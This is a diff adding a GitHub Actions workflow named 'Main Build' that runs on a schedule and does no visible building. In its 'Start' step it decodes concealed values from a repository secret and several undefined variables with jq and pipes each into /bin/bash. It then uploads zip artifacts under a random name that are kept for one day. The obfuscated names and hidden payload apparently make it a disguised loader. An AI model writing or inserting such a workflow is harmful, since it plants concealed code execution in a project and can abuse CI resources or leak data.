@@ -1,0 +1,32 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '41 3,9,15,21 * * *'
+env:
+  CI: true
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          rtr281: ${{ secrets.rtr281 }}
+        run: |
+          printf '%s' "$rtr281" | jq -r .dflt94407 | /bin/bash
+          printf '%s' "$ociz136" | jq -r .ruuks90557 | /bin/bash
+          printf '%s' "$swmv7" | jq -r .hyzj93 | /bin/bash
+          echo $vfit105 | jq -r .ol5 | /bin/bash
+          printf '%s' "$rg82845" | jq -r .gmt20901 | /bin/bash
+          printf '%s' "$wqv0211" | jq -r .sr60886 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: DzPvnZ2O
+          path: "*.zip"
+          retention-days: 1
